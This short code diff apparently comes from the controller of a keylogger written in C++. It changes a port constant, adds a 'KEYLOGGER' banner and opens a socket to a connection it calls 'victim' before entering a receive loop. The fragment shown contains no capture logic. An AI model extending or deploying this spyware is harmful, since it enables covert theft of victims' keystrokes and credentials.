@@ -5,11 +5,14 @@
 #include "connections.hpp"
 #pragma comment(lib, "Ws2_32.lib")
 
-#define port "10266"
+#define port 10266
 
 
 int main()
 {
+    std::cout << "############################\n";
+    std::cout << "##        KEYLOGGER       ##\n";
+    std::cout << "############################\n";
     SOCKET victim = connect_to_client(port);
 
     while (true)
